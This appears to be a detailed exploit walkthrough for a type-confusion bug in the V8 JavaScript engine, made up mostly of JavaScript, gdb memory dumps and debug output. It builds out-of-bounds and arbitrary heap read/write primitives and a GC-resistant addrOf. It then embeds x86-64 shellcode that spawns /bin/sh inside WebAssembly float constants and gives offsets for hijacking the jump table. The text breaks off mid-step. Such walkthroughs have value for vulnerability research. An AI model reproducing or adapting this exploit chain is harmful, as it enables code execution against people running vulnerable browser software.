# Trigger

Successfully trigger the type confusion:

```shell
Debug of corrupted_instance.x
DebugPrint: 0x118e00404bcd: [JSArray] in OldSpace
 - map: 0x118e0018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
             ^^^^^^^^^^^^^^
              same with a
 - length: 8
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.x
DebugPrint: 0x118e00404c01: [JSArray] in OldSpace
 - map: 0x118e0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x118e0018e935 <JSArray[0]>
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS] <--- different elements kind
             ^^^^^^^^^^^^^^
              same with x
 - length: 1
 - properties: 0x118e000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x118e00000d41: [String] in ReadOnlySpace: #length: 0x118e00025e2d <AccessorInfo name= 0x118e00000d41 <String[6]: #length>, data= 0x118e00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x118e00404bf1 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

# Initial read-write primitives

Once the vulnerability is triggered, the same memory region is used for storing the backing buffer of an array with objects (x) as well as the backing buffer and metadata of a packed double array (a). This means that the length property of the packed double array a can be modified by writing to certain elements in the object array.

Look at the memory of JSArray again:

```shell
Debug of corrupted_instance.a
DebugPrint: 0x25a200404ccd: [JSArray] in OldSpace
 - map: 0x25a20018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x25a20018e935 <JSArray[0]>
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x25a2000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x25a200000d41: [String] in ReadOnlySpace: #length: 0x25a200025e2d <AccessorInfo name= 0x25a200000d41 <String[6]: #length>, data= 0x25a200000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x25a200404cbd <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Memmory dump at elements:

```shell
gef➤  x/64x 0x25a200404cbd - 1
0x25a200404cbc:	0x00000851	0x00000002	0x9999999a	0x3ff19999
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of FDA   length=1           1.1              <-- pointer tagging, length = 2 on memory
0x25a200404ccc:	0x0018efc1	0x000006cd	0x00404cbd	0x00000002
                  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^
                  Map of JSArray                       length of JSArray <-- at offset 5
```

FDA stand for FixedDoubleArray.

The following code attempts to write `0x10000` to the length field of the object array:

```js
corrupted_instance.x[5] = 0x10000;
```

Output:

```shell
[+] Triggering the bug...
[+] Corrupting the metadata (length) of corrupted_instance.a ..
[+] Initial corruption succeeded!
Debug of corrupted_instance.x
DebugPrint: 0x17f900404c3d: [JSArray] in OldSpace
 - map: 0x17f90018f041 <Map[16](PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_ELEMENTS]
 - length: 8
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: -858993459
 }

Debug of corrupted_instance.a
DebugPrint: 0x17f900404c71: [JSArray] in OldSpace
 - map: 0x17f90018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x17f90018e935 <JSArray[0]>
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536 <---- 0x10000
 - properties: 0x17f9000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x17f900000d41: [String] in ReadOnlySpace: #length: 0x17f900025e2d <AccessorInfo name= 0x17f900000d41 <String[6]: #length>, data= 0x17f900000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x17f900404c61 <FixedDoubleArray[1]> {
           0: 1.1
 }
```

Once the length of the array is overwritten, out of bounds read/write can be performed, relative to the position of the backing element buffer of the array. To make use of this, the exploit allocates another packed double array and **finds the offset and the element index to reach its metadata from the start of the elements buffer of the corrupted array**.

```js
print("Perfoming read/write out of bounds...");
while (true) {
   let rwarr = [1.1, 2.2, 3.3];
   let rwarr_addr = addrof_tmp(rwarr);
   let a_addr = addrof_tmp(corrupted_instance.a);

   // If our target array to corrupt does not lie after our corrupted array, then
   // we can't do anything. Bail and retry the exploit.
   if (rwarr_addr < a_addr) {
      // print("[+] Target array does not lie after corrupted array. Retrying...");
   } else {
      print(`[+] Address of corrupted_instance.a: 0x${a_addr.toString(16)}`);
      print(`[+] Address of rwArr: 0x${rwarr_addr.toString(16)}`);
      debug_print(`corrupted_instance.a`, corrupted_instance.a);
      debug_print(`rwarr`, rwarr);
      print("[+] Calculating the offset...");
      let offset = (rwarr_addr - a_addr) + 0xc; // 0xc is the offset from the metadata to the backing storage
      if ((offset % 8) != 0) {
            offset -= 4; // turn back 4 bytes if the offset is not divisible by 8 (each element is 8 bytes long),
            // because we need to convert it to number of elements
            // used for changing the backing storage of rwarr through corrupted_instance.a
      }
      print("[+] Offset: " + offset);

      let marker42_idx = offset / 8; // idex of backing storage of corrupted_instance.a
      // marker42_idx += 9; // no need
      break;
   }
}
```

Debug print out both buffers:

```shell
DebugPrint: 0x3ba1001a5d15: [JSArray] in OldSpace
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 65536
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1001a5d05 <FixedDoubleArray[1]> {
           0: 1.1
 }

Debug of rwarr
DebugPrint: 0x3ba1002c267d: [JSArray]
 - map: 0x3ba10018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3ba10018e935 <JSArray[0]>
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x3ba1000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x3ba100000d41: [String] in ReadOnlySpace: #length: 0x3ba100025e2d <AccessorInfo name= 0x3ba100000d41 <String[6]: #length>, data= 0x3ba100000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x3ba1002c265d <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }

[+] Calculating the offset...
[+] Offset: 1165680
[+] Address of backing storage pointer of rwarr: 2c2684
```

First, we calculate the address of the backing storage pointer of `rwarr` from `rwarr_addr`:

```shell
gef➤  x/12x 0x3ba1002c267d - 1 + 8
0x3ba1002c2684:	0x002c265d	0x00000006	0x00001085	0x001a5d51
                  ^^^^^^^^^^
                  elements
0x3ba1002c2694:	0x000007b1	0x002c267d	0x3ff19999	0x000007b1
0x3ba1002c26a4:	0x001a5d15	0x3ff19999	0x000005dd	0x0000000e
```

Then, add `a_addr` with the offset to get the same address:

```shell
gef➤  p 0x3ba1001a5d15 -1 + 1165680
$12 = 0x3ba1002c2684
```

After that, the offset from the backing storage of `corrupted_instance.a` to get the same address need to be added by 16:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165680 + 16
$14 = 0x3ba1002c2684
```

The reason is that the backing storage of `corrupted_instance.a` is 16 bytes before the JSArray object.

```shell
gef➤  x/24x 0x3ba1001a5d05 - 1
0x3ba1001a5d04:	0x00000851	0x00000002	0x001a5d15	0x3ff19999
                  ^^^^^^^^^^                                      
                  Map of FixedDoubleArray                         
0x3ba1001a5d14:	0x0018efc1	0x000006cd	0x001a5d05	0x00020000
                  ^^^^^^^^^^
                  Map of JSArray
0x3ba1001a5d24:	0x001a357d	0x001a357d	0x00000a09	0x00000000
0x3ba1001a5d34:	0x000015d5	0x00028991	0x001a5d2d	0x0018efc1
0x3ba1001a5d44:	0x000006cd	0x002c2149	0x00000006	0x0000150d
0x3ba1001a5d54:	0x001a5d41	0x00000000	0x002c2615	0x00000001
```

We convert the above calculation into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 1165696
$15 = 0x3ba1002c2684
```

And into this:

```shell
gef➤  p 0x3ba1001a5d05 - 1 + 145712*8
$16 = 0x3ba1002c2684
```

Where `145712` is our index of the element that points to the backing storage of rwarr.

Now, we have the ability to point to any memory address as we want through `corrupted_instance.a[145712]`.

If the elements pointer of this array is modified to point to a specific value, then writing to an index in the rwarr will write a controlled float to this chosen address thereby achieving an arbitrary write in the V8 heap.

```js
function v8h_write64(where, what) {
    helper.f64[0] = corrupted_instance.a[marker42_idx];
    if (helper.u32[0] == 0x6) {
        helper.f64[0] = corrupted_instance.a[marker42_idx - 1];
        helper.u32[1] = where - 8;
        corrupted_instance.a[marker42_idx - 1] = helper.f64[0];
    } else if (helper.u32[1] == 0x6) {
        helper.u32[0] = where - 8;
        corrupted_instance.a[marker42_idx] = helper.f64[0];
    }
    rwarr[0] = what;
}
```

The first if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717
0x3cb6002c297c:	0x00000006	0x00001085	0x001a6021	0x000007b1
                  ^^^^^^^^^^  ^^^^^^^^^^
                    u32[0]      u32[1]
0x3cb6002c298c:	0x002c2971	0x3ff19999	0x000007b1	0x001a5fe5
0x3cb6002c299c:	0x3ff19999	0x00000155	0x00000003	0x0000001d
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 8
0x3cb6002c2974:	0x000006cd	0x002c2951	0x00000006	0x00001085
                              ^^^^^^^^^^  
                             u32[1]=where-8    
0x3cb6002c2984:	0x001a6021	0x000007b1	0x002c2971	0x3ff19999
0x3cb6002c2994:	0x000007b1	0x001a5fe5	0x3ff19999	0x00000155
```

The else if statement:

```shell
gef➤  x/12x 0x3cb6001a5fd5 -1 + 8*145717 - 4
0x3cb6002c2978:	0x002c2951	0x00000006	0x00001085	0x001a6021
                  ^^^^^^^^^^  ^^^^^^^^^^
                u32[0]=where-8   u32[1]
0x3cb6002c2988:	0x000007b1	0x002c2971	0x3ff19999	0x000007b1
0x3cb6002c2998:	0x001a5fe5	0x3ff19999	0x00000155	0x00000003
```

Try to write something:

```js
print("[+] Writing data...");
let data = 13.37;                                    // have to be float because rwarr is a float array
let bufToBeWritten = [1.1, 2.2, 3.3, 4.4];
let bufToBeWritten_addr = addrof_tmp(bufToBeWritten);
v8h_write64(bufToBeWritten_addr - 1 + 0x10, data);   // 0x10 is offset of length of JSArray
debug_print('bufToBeWritten', bufToBeWritten);
```

Calculating offset and index:

```shell
[+] Perfoming read and write out of bounds...
[+] Calculating the offset...
[+] Offset: 1298520
[+] Calculating the index...
[+] Index: 162316
[+] The approximately view of pointer's data: 0x13ffd1 0x6
```

Debug print of `bufToBeWritten`:

```shell
[+] Writing data...
Debug of bufToBeWritten
DebugPrint: 0x227005422c5: [JSArray]
 - map: 0x02270018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x02270018e935 <JSArray[0]>
 - elements: 0x0227005422dd <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 511705092 <---- it changed from 4
 - properties: 0x0227000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x22700000d41: [String] in ReadOnlySpace: #length: 0x022700025e2d <AccessorInfo name= 0x022700000d41 <String[6]: #length>, data= 0x022700000061 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x0227005422dd <FixedDoubleArray[4]> {
           0: 1.1
           1: 2.2
           2: 3.3
           3: 4.4
}
```

However both, the `addrof` as well as the write primitive depend on there being no garbage collection run after the successful trigger of the bug. This is because if a GC occurs, then it will move the objects in memory and primitives like corruption of the array elements will no longer work because the metadata and elements region of the array maybe moved to separate regions by the Garbage Collector. A GC can also crash the engine if it sees corrupted metadata like corrupted maps or array lengths or elements pointers.

# GC Resistant Primitives

After triggering GC for moving objects into old space:

```shell
Debug of holder
DebugPrint: 0x385d0019c909: [JS_OBJECT_TYPE] in OldSpace
Debug of changer
DebugPrint: 0x385d0019c931: [JSArray] in OldSpace
Debug of leaker
DebugPrint: 0x385d0019c921: [JSArray] in OldSpace
```

All of the objects are moved to old space.

Once the vulnerability is triggered, the exploit uses the initial `addrof` to find the address of the `changer`/`leaker`/`holder` objects. It then overwrites the elements pointer of the changer object to point to the address of the leaker `object` and also overwrites the elements pointer of leaker `object` to point to the address of the holder `object`. This corruption is done using the heap write primitive achieved in the previous section. The following code shows this.

Layout:

```js
+-------------------------------+
| Changer (Array)               |
|-------------------------------|
| Elements pointer ------------>|------------------------------+
| [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]|                              |
+-------------------------------+                              |
                                                               |
                                                               |
+-------------------------------+                              |
| Leaker (Array)                |<-----------------------------+
|-------------------------------|
| Elements pointer ------------>|------------------------------+
| [1.1, 2.2, 3.3, 4.4, 5.5, 6.6]|                              |
+-------------------------------+                              |
                                                               |
                                                               |
+-------------------------------+                              |
| Holder (Object)               |<-----------------------------+
|-------------------------------|
| p1: 0x1234                    |
| p2: 0x1234                    |
| p3: 0x1234                    |
+-------------------------------+
```

Here is how we do it:

```js
changer_addr = addrof_tmp(changer);
leaker_addr = addrof_tmp(leaker);
holder_addr = addrof_tmp(holder);

helper.u32[1] = 0xc; helper.u32[0] = holder_addr;
original_holder_bytes = helper.f64[0];

helper.u32[1] = 0xc; helper.u32[0] = leaker_addr;
v8h_write64(changer_addr + 0x8, helper.f64[0]);                //0x8 is offset of `elements` pointer
v8h_write64(leaker_addr + 0x8, original_holder_bytes);
```

Output:

```shell
Debug of changer
DebugPrint: 0xa980019ca7d: [JSArray] in OldSpace
 - map: 0x0a980018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a980018e935 <JSArray[0]>
 - elements: 0x0a980019ca6d <JSArray[6]> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
Debug of leaker
DebugPrint: 0xa980019ca6d: [JSArray] in OldSpace
 - map: 0x0a980018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0a980018e935 <JSArray[0]>
 - elements: 0x0a980019ca55 <Object map = 0xa980019c2fd> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
Debug of holder
DebugPrint: 0xa980019ca55: [JS_OBJECT_TYPE] in OldSpace
 - map: 0x0a980019c2fd <Map[24](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0a9800184b21 <Object map = 0xa980018415d>
 - elements: 0x0a98000006cd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x0a98000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0xa980019bdd9: [String] in OldSpace: #p1: 4660 (const data field 0), location: in-object
    0xa980019bde9: [String] in OldSpace: #p2: 4660 (const data field 1), location: in-object
    0xa980019bdf9: [String] in OldSpace: #p3: 4660 (const data field 2), location: in-object
 }
```

Also, remember to fix the corrupted arrays

```js
corrupted_instance.x.length = 0;
corrupted_instance.a.length = 0;
rwarr.length = 0;
```

Use new primitives to read/write:

```js
print("[+] Using new primitives to read data");
v8h_read64(bufToBeWritten_addr + 0x8);
print("[+] The original data: 0x" + helper.u32[0].toString(16) + " 0x" + helper.u32[1].toString(16));
debug_print('bufToBeWritten', bufToBeWritten);

print("[+] Using new primitives to write data");
v8h_write(bufToBeWritten_addr - 1 + 0x10, data);
debug_print('bufToBeWritten', bufToBeWritten);
```

Output:

```shell
[+] Using new primitives to read data
[+] The original data: 0x54223d
Debug of bufToBeWritten
DebugPrint: 0x2e5d00542225: [JSArray]
 - map: 0x2e5d0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2e5d0018e935 <JSArray[0]>
 - elements: 0x2e5d0054223d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x2e5d000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2e5d00000d41: [String] in ReadOnlySpace: #length: 0x2e5d00025e2d <AccessorInfo name= 0x2e5d00000d41 <String[6]: #length>, data= 0x2e5d00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
[+] Using new primitives to write data
Debug of bufToBeWritten
DebugPrint: 0x2e5d00542225: [JSArray]
 - map: 0x2e5d0018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x2e5d0018e935 <JSArray[0]>
 - elements: 0x2e5d0054223d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 109051908
 - properties: 0x2e5d000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x2e5d00000d41: [String] in ReadOnlySpace: #length: 0x2e5d00025e2d <AccessorInfo name= 0x2e5d00000d41 <String[6]: #length>, data= 0x2e5d00000061 <undefined>> (const accessor descriptor), location: descriptor
 }
```

Also, we can leak address with a new `addrOf` primitive:

```js
function addrOf(obj) {
    holder.p2 = obj;
    let ret = leaker[1];
    holder.p2 = 0;
    return helper.f64toi64(ret) & 0xffffffffn;
}
```

Output:

```shell
[+] The address of bufToBeWritten: 0x542205
Debug of bufToBeWritten
DebugPrint: 0x19a700542205: [JSArray]
 - map: 0x19a70018efc1 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x19a70018e935 <JSArray[0]>
 - elements: 0x19a70054221d <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x19a7000006cd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x19a700000d41: [String] in ReadOnlySpace: #length: 0x19a700025e2d <AccessorInfo name= 0x19a700000d41 <String[6]: #length>, data= 0x19a700000061 <undefined>> (const accessor descriptor), location: descriptor
 }
```

# WebAssembly and Shellcode

We need to find `jump_table_start` offset.

The memory on the heap:

```shell
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00001d75e0000000 0x00001d75f0000000 0x0000000000000000 --- 
0x00002ee300000000 0x00002eeb00000000 0x0000000000000000 --- 
0x00002eeb00000000 0x00002eeb00010000 0x0000000000000000 r-- 
0x00002eeb00010000 0x00002eeb00020000 0x0000000000000000 --- 
0x00002eeb00020000 0x00002eeb00040000 0x0000000000000000 r-- 
0x00002eeb00040000 0x00002eeb00145000 0x0000000000000000 rw- 
0x00002eeb00145000 0x00002eeb00180000 0x0000000000000000 --- 
0x00002eeb00180000 0x00002eeb001c0000 0x0000000000000000 rw- 
0x00002eeb001c0000 0x00002eeb001cd000 0x0000000000000000 r-- 
0x00002eeb001cd000 0x00002eeb00200000 0x0000000000000000 --- 
0x00002eeb00200000 0x00002eeb002c3000 0x0000000000000000 rw- 
0x00002eeb002c3000 0x00002eeb00300000 0x0000000000000000 --- 
0x00002eeb00300000 0x00002eeb00680000 0x0000000000000000 rw- 
0x00002eeb00680000 0x00002eec00000000 0x0000000000000000 --- 
0x00002eec00000000 0x00002eec00100000 0x0000000000000000 rw- 
0x00002eec00100000 0x00002eee00000000 0x0000000000000000 --- 
0x00002eee00000000 0x00002eee02000000 0x0000000000000000 --- 
0x00002eee02000000 0x00002ff300000000 0x0000000000000000 --- 
0x0000360ffa27c000 0x0000360ffa27d000 0x0000000000000000 rwx  <---- RWX memory
0x0000360ffa27d000 0x0000360ffa27e000 0x0000000000000000 --- 
0x0000560f8ce2f000 0x0000560f8d281000 0x0000000000000000 r-- /home/aleister/Workspaces/v8-exploitation/v8/out/release-c21e8fe0c5b/d8
...
```

Layout of `WasmInstanceObject`:

```shell
DebugPrint: 0x2eeb00431da5: [WasmInstanceObject] in OldSpace
 - map: 0x2eeb00191215 <Map[208](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x2eeb001912c1 <Object map = 0x2eeb00431ff5>
 - elements: 0x2eeb000006a5 <FixedArray[0]> [HOLEY_ELEMENTS]
 - module_object: 0x2eeb00542465 <Module map = 0x2eeb001910ed>
 - exports_object: 0x2eeb00542545 <Object map = 0x2eeb00431f99>
 - native_context: 0x2eeb00183c51 <NativeContext[284]>
 - memory_objects: 0x2eeb000006a5 <FixedArray[0]>
 - tables: 0x2eeb000006a5 <FixedArray[0]>
 - indirect_function_tables: 0x2eeb000006a5 <FixedArray[0]>
 - imported_function_refs: 0x2eeb000006a5 <FixedArray[0]>
 - indirect_function_table_refs: 0x2eeb000006a5 <FixedArray[0]>
 - wasm_internal_functions: 0x2eeb00542515 <FixedArray[1]>
 - managed_object_maps: 0x2eeb00542539 <FixedArray[1]>
 - feedback_vectors: 0x2eeb000006a5 <FixedArray[0]>
 - well_known_imports: 0x2eeb000006a5 <FixedArray[0]>
 - memory0_start: 0x2feaffffffff
 - memory0_size: 0
 - new_allocation_limit_address: 0x560fa05a1db0
 - new_allocation_top_address: 0x560fa05a1da8
 - old_allocation_limit_address: 0x560fa05a1dc8
 - old_allocation_top_address: 0x560fa05a1dc0
 - imported_function_targets: 0x2eeb00000e19 <ByteArray[0]>
 - globals_start: 0x2feaffffffff
 - imported_mutable_globals: 0x2eeb00000e19 <ByteArray[0]>
 - indirect_function_table_size: 0
 - indirect_function_table_sig_ids: 0x2eeb00000e19 <ByteArray[0]>
 - indirect_function_table_targets: 0x2eeb0000604d <ExternalPointerArray[0]>
 - isorecursive_canonical_types: 0x560fa061e260
 - jump_table_start: 0x360ffa27c000
 - data_segment_starts: 0x2eeb00000e19 <ByteArray[0]>
 - data_segment_sizes: 0x2eeb00000e19 <ByteArray[0]>
 - element_segments: 0x2eeb000006a5 <FixedArray[0]>
 - hook_on_function_call_address: 0x560fa05b6a19
 - tiering_budget_array: 0x560fa05f2ed0
 - memory_bases_and_sizes: 0x2eeb00000e19 <ByteArray[0]>
 - break_on_entry: 0
 - properties: 0x2eeb000006a5 <FixedArray[0]>
 - All own properties (excluding elements): {}
```

The offset from WASM instance to `jump_table_start` is `0x48`. Obviously, from here, the only thing we can do is copy shellcode into RWX memory page. But we can not write directly to the RWX memory as it will lead to crash. So, we only have the control over RIP (the `jump_table_start`).

The constants declared in the WebAssembly code **can potentially be interpreted as assembly code** by jumping in the middle of an instruction, which is valid on machines that run Intel architecture. Hence with the RIP control described in the previous section, it is possible to **redirect the RIP into the middle of some compiled wasm code which has controlled float constants and interpret them as x86-64 instructions**.

The WebAssembly code:

```js
(module
  (type (;0;) (func (result i32)))
  (func (;0;) (type 0) (result i32)
    i32.const 0
    f64.const 0x0p+0 (;=0;)
    f64.store
    i32.const 0
    f64.const 0x1.b909090583b6ap-833 (;=3.00779e-251;)
    f64.store
    i32.const 0
    f64.const 0x1.b5b0068732f68p-833 (;=2.98496e-251;)
    f64.store
    i32.const 0
    f64.const 0x1.b596e69622f68p-833 (;=2.98429e-251;)
    f64.store
    i32.const 0
    f64.const 0x1.b909020e3c148p-833 (;=3.00779e-251;)
    f64.store
    i32.const 0
    f64.const 0x1.b909053cb0148p-833 (;=3.00779e-251;)
    f64.store
    i32.const 0
    f64.const 0x1.b909090e78948p-833 (;=3.00779e-251;)
    f64.store
    i32.const 0
    f64.const 0x1.bd23148f63148p-833 (;=3.03576e-251;)
    f64.store
    i32.const 0
    f64.const 0x1.b90909090050fp-833 (;=3.00779e-251;)
    f64.store
    i32.const 42)
  (table (;0;) 0 funcref)
  (memory (;0;) 1)
  (export "memory" (memory 0))
  (export "main" (func 0)))
```

Its compiled version:

```shell
; section "Code" (10)
0000031: 0a                                        ; section code
0000032: 00                                        ; section size (guess)
0000033: 01                                        ; num functions
; function body 0
0000034: 00                                        ; func body size (guess)
0000035: 00                                        ; local decl count
0000036: 41                                        ; i32.const
0000037: 00                                        ; i32 literal
0000038: 44                                        ; f64.const
0000039: 0000 0000 0000 0000                       ; f64 literal
0000041: 39                                        ; f64.store
0000042: 03                                        ; alignment
0000043: 00                                        ; store offset
0000044: 41                                        ; i32.const
0000045: 00                                        ; i32 literal
0000046: 44                                        ; f64.const
0000047: 6a3b 5890 9090 eb0b                       ; f64 literal
000004f: 39                                        ; f64.store
0000050: 03                                        ; alignment
0000051: 00                                        ; store offset
0000052: 41                                        ; i32.const
0000053: 00                                        ; i32 literal
0000054: 44                                        ; f64.const
0000055: 682f 7368 005b eb0b                       ; f64 literal
000005d: 39                                        ; f64.store
000005e: 03                                        ; alignment
000005f: 00                                        ; store offset
0000060: 41                                        ; i32.const
0000061: 00                                        ; i32 literal
0000062: 44                                        ; f64.const
0000063: 682f 6269 6e59 eb0b                       ; f64 literal
000006b: 39                                        ; f64.store
000006c: 03                                        ; alignment
000006d: 00                                        ; store offset
000006e: 41                                        ; i32.const
000006f: 00                                        ; i32 literal
0000070: 44                                        ; f64.const
0000071: 48c1 e320 9090 eb0b                       ; f64 literal
0000079: 39                                        ; f64.store
000007a: 03                                        ; alignment
000007b: 00                                        ; store offset
000007c: 41                                        ; i32.const
000007d: 00                                        ; i32 literal
000007e: 44                                        ; f64.const
000007f: 4801 cb53 9090 eb0b                       ; f64 literal
0000087: 39                                        ; f64.store
0000088: 03                                        ; alignment
0000089: 00                                        ; store offset
000008a: 41                                        ; i32.const
000008b: 00                                        ; i32 literal
000008c: 44                                        ; f64.const
000008d: 4889 e790 9090 eb0b                       ; f64 literal
0000095: 39                                        ; f64.store
0000096: 03                                        ; alignment
0000097: 00                                        ; store offset
0000098: 41                                        ; i32.const
0000099: 00                                        ; i32 literal
000009a: 44                                        ; f64.const
000009b: 4831 f648 31d2 eb0b                       ; f64 literal
00000a3: 39                                        ; f64.store
00000a4: 03                                        ; alignment
00000a5: 00                                        ; store offset
00000a6: 41                                        ; i32.const
00000a7: 00                                        ; i32 literal
00000a8: 44                                        ; f64.const
00000a9: 0f05 9090 9090 eb0b                       ; f64 literal
00000b1: 39                                        ; f64.store
00000b2: 03                                        ; alignment
00000b3: 00                                        ; store offset
00000b4: 41                                        ; i32.const
00000b5: 2a                                        ; i32 literal
00000b6: 0b                                        ; end
; move data: [35, b7) -> [36, b8)
0000034: 8201                                      ; FIXUP func body size
; move data: [33, b8) -> [34, b9)
0000032: 8501                                      ; FIXUP section size
```

Also, we find the offset from `jump_table_start` to the exported function is `0xb58` and offset to the middle of the function for achieving arbitrary code execution is `0x2d`.

The native compiled code of the `main` function:

```shell
gef➤  x/48i 0x6915065ab40
   0x6915065ab40:	push   rbp
   0x6915065ab41:	mov    rbp,rsp
   0x6915065ab44:	push   0x8
   0x6915065ab46:	push   rsi
   0x6915065ab47:	sub    rsp,0x10
   0x6915065ab4e:	cmp    rsp,QWORD PTR [r13-0x60]
   0x6915065ab52:	jbe    0x6915065ac1e
   0x6915065ab58:	vxorpd xmm0,xmm0,xmm0
   0x6915065ab5c:	mov    rax,QWORD PTR [rsi+0x27]
   0x6915065ab60:	shr    rax,0x18
   0x6915065ab64:	add    rax,r14
   0x6915065ab67:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab6b:	movabs r10,0xbeb909090583b6a
   0x6915065ab75:	vmovq  xmm0,r10
   0x6915065ab7a:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab7e:	movabs r10,0xbeb5b0068732f68
   0x6915065ab88:	vmovq  xmm0,r10
   0x6915065ab8d:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ab91:	movabs r10,0xbeb596e69622f68
   0x6915065ab9b:	vmovq  xmm0,r10
   0x6915065aba0:	vmovsd QWORD PTR [rax],xmm0
   0x6915065aba4:	movabs r10,0xbeb909020e3c148
   0x6915065abae:	vmovq  xmm0,r10
   0x6915065abb3:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abb7:	movabs r10,0xbeb909053cb0148
   0x6915065abc1:	vmovq  xmm0,r10
   0x6915065abc6:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abca:	movabs r10,0xbeb909090e78948
   0x6915065abd4:	vmovq  xmm0,r10
   0x6915065abd9:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abdd:	movabs r10,0xbebd23148f63148
   0x6915065abe7:	vmovq  xmm0,r10
   0x6915065abec:	vmovsd QWORD PTR [rax],xmm0
   0x6915065abf0:	movabs r10,0xbeb90909090050f
   0x6915065abfa:	vmovq  xmm0,r10
   0x6915065abff:	vmovsd QWORD PTR [rax],xmm0
   0x6915065ac03:	mov    r10,QWORD PTR [rsi+0x77]
   0x6915065ac07:	sub    DWORD PTR [r10],0xc3
   0x6915065ac0e:	js     0x6915065ac2c
   0x6915065ac14:	mov    eax,0x2a
   0x6915065ac19:	mov    rsp,rbp
   0x6915065ac1c:	pop    rbp
   0x6915065ac1d:	ret
```

Jump to the contsant declaration:

```shell
